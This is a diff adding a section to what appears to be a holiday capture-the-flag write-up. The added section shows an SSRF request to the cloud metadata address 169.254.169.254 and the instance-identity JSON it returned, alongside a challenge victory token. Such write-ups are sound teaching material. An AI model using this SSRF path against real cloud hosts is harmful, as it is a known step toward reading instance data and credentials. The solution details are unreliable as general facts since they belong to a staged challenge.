@@ -150,6 +150,30 @@ This gives
     	'victoryToken': '{ hash:"95be38fd06f44e4587060a32fe0c8ca825bfcab13fb9715090ca47632a4aabe5", resourceId: "eebff00a-1b54-448a-8aa0-97912e64c2b9"}'
     }
 
+# Now hiring!
+
+If you SSRF with the URL http://169.254.169.254/latest/dynamic/instance-identity/document/ and after a ```curl``` it brings back the following that contains a region, presumable that means North Pole. I hope so anyway...
+
+    {
+        "accountId": "PCRVQVHN4S0L4V2TE",
+        "imageId": "ami-0b69ea66ff7391e80",
+        "availabilityZone": "np-north-1f",
+        "ramdiskId": null,
+        "kernelId": null,
+        "devpayProductCodes": null,
+        "marketplaceProductCodes": null,
+        "version": "2017-09-30",
+        "privateIp": "10.0.7.10",
+        "billingProducts": null,
+        "instanceId": "i-1234567890abcdef0",
+        "pendingTime": "2019-10-31T07:02:24Z",
+        "architecture": "x86_64",
+        "instanceType": "m4.xlarge",
+        "region": "np-north-1"
+    }
+
+
+
 # Grasping at straws
 
 No 13th floor in Jack Frost Towers
